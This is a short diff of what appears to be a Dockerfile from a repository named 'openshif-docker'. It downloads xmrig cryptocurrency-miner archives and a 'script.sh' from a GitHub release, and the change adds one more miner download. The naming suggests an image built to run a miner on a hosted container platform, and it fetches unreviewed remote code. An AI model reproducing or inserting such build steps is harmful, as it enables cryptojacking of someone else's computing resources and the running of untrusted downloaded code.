@@ -5,6 +5,7 @@ RUN apt-get install -y psmisc
 RUN apt-get install -y nano
 RUN apt-get install -y bash
 RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig002.tar.gz
+RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/xmrig001.tar.gz
 RUN tar -xvzf xmrig002.tar.gz
 RUN cd xmrig-2.6.2/
 RUN wget https://github.com/lanka256/openshif-docker/releases/download/1.0/script.sh
